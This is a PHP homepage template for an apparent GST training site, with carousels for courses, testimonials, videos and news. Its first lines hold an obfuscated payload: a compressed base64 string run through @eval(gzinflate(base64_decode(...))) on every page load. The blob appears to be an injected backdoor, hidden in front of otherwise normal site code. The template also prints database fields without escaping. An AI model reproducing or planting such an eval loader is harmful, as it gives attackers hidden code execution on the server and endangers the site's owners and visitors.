
<?php
$data='1VbNbttGEL4H8DtsHMFLopKpNHZQx1BtVaAsAbKkklRS23EIilxKRPkH7sqVavvUe9ECvfSQQ3PqrU9Q5GWapn2Lzi4lmpSs2gVaoCFgaHdmvvn5ZnbXDnG9kEj4hRMGjk6SC5LgMhpalDzdMR1iRw4orZZWtVvHTzuzvXgYOBf20d7MadlT++PjyWngz05fPN891Xerwyf1i5MvPouxLO9vPHDmrgeJDy4fkiBmM6lk6qr2XNXOsKZ+PlB1wxxobXwuowO0RoWeIWkF3K8bLbPdbfaWoTnFrcCe1j4y16KXtbfHbvVh3WmuhM7kAMMKkCBoUBTkhQ6ZbsfjGP3269v3P/z8x9sff3/9E/rz9Zt3333fbuvvv/3l3ZtvhGmRtNXgK6xJlCVxRNeZlBHOomMZ1Wo15Fo+JRx5A9EbWrtvmN36sQrZbyM6GYLb9T5B6ZNwnQOoGxhYm/OH3M/CXFvQoRvzlmH0zQHszPqR2jXAW85WIy4Ye5QSJi1BNLWpaqrGo29trR6TZZuD5ZCZjmeJ80H7Ws/oNXqdWweJY/V50BUpeghzgiPXhZG5usrp01+z39OgQJgmtLPzBFLCY8ZiinkGfFXIQossB5fxgRMFlhfWMIxX5m9TVNDq6cYmHzu8FVtsLExg/oWAxp5DEiGa8JkTF9LAkoUyIS5JVrTAdaqOk4hFduQL/YKMYldGFMjBh0dRNPLJ1Qlh3lVowR146OH07JZ0BEzAvHvwh0FUghQZSUIufvRKkUZWQLxwdDUkjMGvXDmzKl/XK6fVyl7l/COl9EiAQvIVja2YJBymvHqpZIKX29PALyk4l1Y9IXy04oSMzMBi9lhaBC1zXkTL5qcetmUxm6Jj4mTnCzy2YrrkKQuc+uLWGw88F0k8KvecM+b8lBHnU0aXGw8QfKUhVGBRKuUeDE72/6m9PE9ijyNIdrGbegyW17zWtNqVKiFoVuSCjkzAP0URPvk4799Ix8SCAqTNRhQyErKKMYvJM8TIlCljFvj79thK4NDXJsytfLIp55DC2yqT3H/BLE2dL68Jv7g9V+JtlS/vlcT0v8jhEt3p4l8fiPUtF5ooro0I63jhlzifeTQ0XX9Cx1JeWJRci7lwJ6HNvCgUpZQg9JxfYHuhMoEGyqiEbVCbXugxLOcmpOTAychUuYBCBvxHMdz9Thk1Blqn1+fPYQfeDx7qTlNd75jAX7t50ldVrYya9Y6u/hMYp/zesEav21UbhtE+VnsDgO1Wq9W7UZn54+q97PlTKV7KcrHTdyM11RhoXUOrd/UmZ8PQBrmqSmTRBzIlNgCXHNp+RElBnBA2gQu9RDJJOuU3E4NKkAOMAAXXZzkxfOmDh2qfLiu4LiBsHDlCi49UA5dXTSaUJKY1gmMrzApU3GLOvIBEk9T2cXXJ4Hxpjyn116UGx9RzZ2ZM4B9+biLejr/zd76f58PmV82UAR/wEhErMOcC04YdA37nhMkFVEJoDELeoUPX84kJZzZFhiw9duV5IlmEggN+MeecZE9e/p7m37yjQpnHX+fWi64v3N00Xyyu/wI=';
@eval(gzinflate(base64_decode($data)));?>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <title>Edu-gst | Home </title>
    <meta name="description" value="We are a leading centre for in-depth education and training in Goods and Services Tax (GST).
We are committed in providing individuals, businesses, and professionals with the expertise skills
to navigate the complexities of GST with proficiency. Through our expert-led training programs we
aim to bridge the knowledge gap and prepare you to achieve the next elevation – for organizations
and yourselves.">
<meta name="keyword" value="about-us, edugst">
</head>
<?php include'header2.php';?>




<section>
    <div id="carouselExampleCaptions" class="carousel slide" data-bs-ride="carousel">   
        <div class="carousel-inner">
        <!-- Slide 1 -->
        <?php
            $conn = $pdo->open();

        try {
          $stmt = $conn->prepare("SELECT * FROM banner ORDER BY creationDate DESC");
          $cnt = 1;
          $stmt->execute();
          foreach($stmt as $row){
            $image = (!empty($row['image'])) ? 'admin/assets/images/banner/'.$row['image'] : 'assets/images/users/profile.jpg';
        ?>
            <div class="carousel-item <?php echo ($cnt == 1) ? 'active' : ''; ?>" data-bs-interval="3000">
                <img src="<?php echo $image; ?>" class="d-block w-100" alt="banner" style="height:80vh;">
                <div class="carousel-caption d-flex flex-column h-100 align-items-center  justify-content-center bottom-0">
                    <div class="carousel-text ">
                        <h2 class="py-2 px-4 text-white story animate-h2"><?php echo $row['tagline']; ?></h2>
                        <p class="px-4 text-white story animate-p"><?php echo $row['description']; ?></p>
                        <div>
                            <a href="<?php echo $row['url']; ?>" class="btn btn-outline bg-info text-white px-4 py-2 rounded-0 animate-btn">View Courses</a>
                            <a href="about" class="btn btn-outline-light px-4 py-2 rounded-0 animate-btn">Know More</a>
                        </div>
                    </div>
                </div>
            </div>
        <?php 
              $cnt++;
          }
        } catch(PDOException $e) {
          echo $e->getMessage();
        }

        $pdo->close();
        ?>    
        </div>

        <!-- Carousel Controls (Now with functionality) -->
        <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide="prev">
              <span class="carousel-control-prev-icon" aria-hidden="true"></span>
              <span class="visually-hidden">Previous</span>
        </button>
        <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide="next">
              <span class="carousel-control-next-icon" aria-hidden="true"></span>
              <span class="visually-hidden">Next</span>
        </button>
    </div>
</section>
<section style="background-image:url('asset/images/edugstbg.png')"> 
    <div class="container-fluid knowledge-section">
        <div class="container">
            <div class="row align-items-center"> 
                <div class="col-md-3 text-center"> 
                    <h6 class="fw-bold text-center">EMBARK ON YOUR JOURNEY TO GST MASTERY WITH US</h6> 
                </div>
                <div class="col-md-9">
                    <p class="knowledge-text" style="    text-align: justify;">
                        Our courses are meticulously designed and scientifically classified to cater to all levels of learners, ensuring that each student reaches their full potential. Whether you're a beginner or looking to deepen your knowledge, you'll discover engaging and valuable insights throughout our program. Join us today and unlock the fascinating world of GST!
                    </p>
                </div>
            </div>
        </div>
    </div>
</section>
<section>
   <div class="container my-1">
        <div class="col-12 col-sm-4 mx-auto ">
            <center><img src="asset/images/star.png" alt="Logo" class="mx-auto " style="width: 60px;"></center>
            <h2 class=" text-center ">FEATURED COURSES</h2>
            <p class="text-center text-muted fw-semibold" >ALL THE TOP COURSES WE OFFERED</p>
            <div class="bg-warning mx-auto" style="width:50px;height:3px !important"></div>
        </div>
        <div class="owl-carousel owl-theme pt-4">
            <!-- Business Law -->
            <?php
            $conn = $pdo->open();

            try{
              $stmt = $conn->prepare("SELECT * FROM tbl_course");
              $cnt=1;
              $stmt->execute();
              foreach($stmt as $row){
              //  $image = (!empty($row['photo'])) ? 'assets/images/side_banner/'.$row['photo'] : 'assets/images/users/profile.jpg';
                
            ?>
            <div class="item">
                <div class="card course-card  p-3">
                    <div class="course-img-container">
                        <a href="courses_sub_page?slug=<?php echo $row['slug'];?>">
                        <img src="admin/assets/images/course/<?php echo $row['image'];?>" class="" height="200" alt="Business Law">
                        <div class="overlay d-flex flex-column align-items-center course-img-container1">
                        </div>
                        </a>
                    </div>
                    <br>
                    <div class="course-body p-2">
                        <div class="d-flex justify-content-between course-title-price mb-2 gap-2" style="margin-top: -6px;">
                        <h6 class=" fs-5"><?php echo $row['name'];?></h6>
                        <span class="fw-bold" style="color:#194369;">₹<?php echo $row['price'];?></span>
                    </div>
                    <div class="blog-card-footer text-start  mb-2" >
                    <span  class="text-black"><i class="fa-solid fa-calendar-days  text-warning " style="font-size: 14px; width:23px!important;"></i> <?php echo $row['duration'];?></span>
                    <span  class="text-black"><i class="fa-solid fa-user text-warning " style="font-size: 14px; width:23px!important;"></i> <?php echo $row['teacher'];?></span>
                    <span  class="text-black"><i class="fa-duotone fa-solid fa-graduation-cap text-warning" style="font-size: 14px; width:23px!important;"></i>Beginner</span>
                </div>
                  <div class="underline-container">
                     <div class="underline"></div>
                  </div>
                  <small class="card-text text-muted py-3" style="text-align: justify;"><?php echo mb_strimwidth($row['about'], 0, 140, "..."); ?></small>
                  <a href="courses_sub_page?slug=<?php echo $row['slug'];?>" class="btn btn-outline py-2 w-50 text-white my-1" style="background-color:#194369; border-radius: 0;" >Learn More</a>
                  <!--<a href="https://graphy.com/" class="btn btn-danger apply-btn mhh1">Learn More</a>-->
               </div>
            </div>
         </div>
          <?php 
                      }
                    }
                    catch(PDOException $e){
                      echo $e->getMessage();
                    }

                    $pdo->close();
                  ?> 
         <!-- Repeat other course cards similarly -->
      </div>
   </div>
</section>
 <br>
    <br>
     
                                                                            <!-- Testimonial Section -->  
     
     
   

    
    
<section class=" " style="background-image: url('asset/images/cp.png'); height: 515px; background-size: cover;">
    <div class="container text-center d-flex justify-content-center align-items-center" style="height: 100%;">
        <!-- Owl Carousel for Testimonials -->
        <div class="owl-carousel scroll owl-theme">
            <!-- First slide: Priyanka Shewale -->
             <?php
                    $conn = $pdo->open();

                    try{
                      $stmt = $conn->prepare("SELECT * FROM parent_testi");
                      $cnt=1;
                      $stmt->execute();
                      foreach($stmt as $row){
                        $image = (!empty($row['image'])) ? 'admin/assets/images/parent/'.$row['image'] : 'assets/images/users/profile.jpg';
                        
                        ?>
            <div class="item">
                <p class="mhh1 text-center text-white" style="text-align: justify;">
                   <?php echo $row['description'];?>
                </p>
                <p class="text-white">
                    <span class="highlight fw-bold"><?php echo $row['name'];?></span> - <?php echo $row['about'];?>
                </p>
                <center>
                    <img src="<?php echo $image;?>" class="rounded-circle img-fluid" height="100" style="width: 8%;" alt="Priyanka Shewale">
                </center>
            </div>
            <?php 
                      }
                    }
                    catch(PDOException $e){
                      echo $e->getMessage();
                    }

                    $pdo->close();
                  ?>
        </div>
    </div>

    <!-- Background section after the content -->
    <div class="background-section mt-4">
        <!-- Background content here -->
    </div>

    <script>
        $(document).ready(function(){
            $(".scroll ").owlCarousel({
                items: 1,             // Show only one item at a time
                loop: true,           // Enable infinite looping
                margin: 10,           // Space between items
                nav: true,            // Enable navigation arrows
                dots: true,           // Enable dot indicators
                autoplay: true,       // Enable auto-slide
                autoplayTimeout: 3000, // Set slide interval to 3 seconds
                autoplayHoverPause: true, // Pause when hovering
            });
        });
    </script>
</section>








<section>
   <div class="container">
      <div class="row align-items-center">
         <div class="col-12 col-sm-4 mx-auto">
            <center>
               <img src="asset/images/star.png" alt="Logo" class="mx-auto" style="width: 60px;">
            </center>
            <h2 class="text-center">LATEST VIDEO'S</h2>
            <p class="text-center text-muted fw-semibold">FOLLOW US FOR MORE VIDEO'S</p>
            <div class="bg-warning mx-auto" style="width:50px;height:3px !important"></div>
         </div>
      </div>

      <div class="row mt-4">
         <div class="owl-carousel owl-theme">
            <?php
               $conn = $pdo->open();
               try {
                   $stmt = $conn->prepare("SELECT * FROM tbl_videos");
                   $cnt = 1;
                   $stmt->execute();
                   foreach($stmt as $row) {
            ?>
            <div class="item">
               <div class="position-relative">
                  <iframe class="shadow" width="100%" height="315" style="border-radius:15px;" src="<?php echo $row['video_url'];?>" title="<?php echo $row['name'];?>" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
                   <div class="position-absolute w-100  h-100 top-0 d-flex justify-content-center align-items-center">
                  <button class="btn btn-danger play-video-btn" data-bs-toggle="modal" data-bs-target="#videoModal" data-video-url="<?php echo $row['video_url'];?>" style="margin-top: 1px; margin-left: 12px; height: 52px; width: 90px;">Play</button>
                  </div>
               </div>
            </div>
            <?php
                   }
               } catch(PDOException $e) {
                   echo $e->getMessage();
               }
               $pdo->close();
            ?>
         </div>
      </div>
   </div>
   <script>
  $(document).ready(function(){
    $('.owl-carousel').owlCarousel({
      loop: true,
      margin: 10,
      nav: true,
      autoplay: true,
      autoplayTimeout: 5000,
      responsive: {
        0: {
          items: 1
        },
        600: {
          items: 2
        },
        1000: {
          items: 3
        }
      }
    });
  });
</script>

</section>


<!-- Modal -->
<div class="modal fade" id="videoModal" tabindex="-1" aria-labelledby="videoModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg modal-dialog-centered">
        <div class="modal-content">
            <div class="modal-body">
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                <div class="ratio ratio-16x9">
                    <iframe id="videoFrame" src="" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
                </div>
            </div>
        </div>
    </div>
</div>



                                                                    <!-- End video Section -->


                                                                          <!--vision Mission-->

<section class=" mt-5">
    <div class="container-fluid">
        <div class="row ">
            <div class="col-lg-6 col-md-12 custom-image-container ">
                <div class="custom-left-image" style="background-image: url('https://img.freepik.com/premium-photo/woman-student-portrait-smile-graduate-with-achievement-higher-education-happy-female-academic-smiling-graduation-holding-certificate-qualification-degree-university-scholarship_590464-144452.jpg?w=740'); background-size: cover; height: 100%;"></div>
            </div>
           <div class="col-lg-6 col-md-12 custom-values-section ">
    <div class="custom-values-card  d-flex align-items-center  vision w-100">
        <div class="custom-icon">
                   <img src="asset/images/trophy.png"  alt="Strategy Icon">
        </div>
        <div class="custom-content-text ms-3 text-center text-md-start"> <!-- Added text-center for mobile view -->
            <h6 class="mhh1 text-uppercase fw-semibold   inter">Our Vision</h6>
            <p class="fs-6">Edu-GST  aims to deepen the impact and broaden its reach, all staying true to its mission by dedicatedly providing excellence to individuals and professionals to achieve great success through our innovative learning platform.</p>
        </div>
    </div>
    <div class="custom-values-card d-flex align-items-center vision w-100">
        <div class="custom-icon">
            <img src="asset/images/trophy.png" alt="Strategy Icon">
        </div>
        <div class="custom-content-text ms-3 text-center text-md-start"> <!-- Added text-center for mobile view -->
            <h6 class="mhh1 text-uppercase fw-semibold inter">Our Mission</h6>
            <p class="fs-6">At Edu-GST we educate leaders by simplifying GST through exclusively designed courses and embracing the view of a rapidly changing world dynamic environment, challenging issues with a global perspective.</p>
        </div>
    </div>
   
        </div>
         </div>
            </div>
        </section>



                                                                    <!-- start latest news-->
                                                                    


<section class="mb-5">
    <div class="container">
        <div class="col-12 col-sm-4 mx-auto text-center">
            <div class="d-flex justify-content-center">
                <a href="latestnews.php">  
                    <img src="asset/images/star.png" alt="Logo" class="mx-auto" style="width: 60px;">
              </a>
            </div>
            <h2 class="text-center">LATEST NEWS</h2>
            <p class="text-center text-muted fw-semibold">ALL ABOUT EDU-GST UPDATES</p>
            <div class="bg-warning mx-auto" style="width: 50px; height: 3px !important;"></div>
        </div>
        
        <div class="owl-carousel owl-theme mt-4">
            <?php
                                            $conn = $pdo->open();
                        
                                            try{
                                              $stmt = $conn->prepare("SELECT * FROM tbl_news Order By creation_on DESC");
                                              $cnt=1;
                                              $stmt->execute();
                                              foreach($stmt as $row){
                                                $image = (!empty($row['image'])) ? 'admin/assets/images/news/'.$row['image'] : 'assets/images/users/profile.jpg';
                                                
                                        ?>
            <div class="item">
                <div class="card d-flex flex-column" style="border: none;">
                    <a href="news_details?id=<?php echo $row['id'];?>">
                          <img src="<?php echo $image;?>" style="height: 290px;" alt="Science Research">
                    </a>
                    <div class="card-body">
                        <span class="badge bg-warning text-dark"><?php echo $row['creation_on'];?></span>
                        <h5 class="card-title mt-2" style="text-align: justify;"><?php echo mb_strimwidth($row['name'], 0, 50, "..."); ?> </h5>
                        <small class="card-text text-muted" style="text-align: justify;"><?php echo mb_strimwidth($row['description'], 0, 100, "..."); ?></small>
                              <!--  <div class="blog1-card-footer text-start  mt-2">
                    <span class="text-black"><i class="fa-solid fa-user text-warning " style="font-size: 14px; width:23px!important;"></i> G5PLUSACC</span>
                    <span  class="text-black"><i class="fa-solid fa-eye text-warning" style="font-size: 14px; width:23px!important;"></i> 3732</span>
                </div>-->
                    </div>
                </div>
            </div>
              <?php 
                      }
                    }
                    catch(PDOException $e){
                      echo $e->getMessage();
                    }

                    $pdo->close();
                  ?>    

        </div>
    </div>
</section>

     
    
     
     
     
     
    





<script>
$(document).ready(function(){
    $('.owl-carousel').owlCarousel({
        loop: true,
        margin: 10,
        nav: true,
        autoplay: true,
        autoplayTimeout: 3000,
        responsive: {
            0: {
                items: 1
            },
            600: {
                items: 2
            },
            1000: {
                items: 3
            }
        }
    });
});
</script>

<script>
$(document).ready(function(){
    // Initialize the custom carousel
    $('.owl-carousel-alt').owlCarousel({
        loop: true,
        margin: 10,
        nav: true,
        autoplay: true,
        autoplayTimeout: 3000,
        items: 1, // Display only one item at a time
        responsive: {
            0: {
                items: 1
            },
            600: {
                items: 1
            },
            1000: {
                items: 1
            }
        }
    });
});
</script>







<!--testimonial script-->
<script>
// JavaScript to handle image click and show respective content
document.querySelectorAll('.clickable-image').forEach(function(img) {
    img.addEventListener('click', function() {
        // Hide all content boxes
        document.querySelectorAll('.content-box').forEach(function(content) {
            content.classList.remove('active-content');
        });

        // Show the clicked image's associated content
        const contentId = img.getAttribute('data-content');
        document.getElementById(contentId).classList.add('active-content');
    });
});
</script>



<script>
    // Get all clickable images
    const images = document.querySelectorAll('.clickable-image');

    // Add click event listener to each image
    images.forEach(image => {
        image.addEventListener('click', function () {
            // Apply blur to all images
            images.forEach(img => img.classList.add('blurred-image'));

            // Remove blur from the clicked image
            this.classList.remove('blurred-image');
        });
    });
</script>
<!--testimonial script-->

<script>
document.addEventListener('DOMContentLoaded', function () {
    var videoModal = document.getElementById('videoModal');
    var videoFrame = document.getElementById('videoFrame');
    var playButtons = document.querySelectorAll('.play-video-btn');

    playButtons.forEach(function(button) {
        button.addEventListener('click', function() {
            var videoSrc = button.getAttribute('data-video-url');
            videoFrame.src = videoSrc;
        });
    });

    videoModal.addEventListener('hidden.bs.modal', function () {
        videoFrame.src = '';
    });
});
</script>



    
<?php include 'footer2.php';?>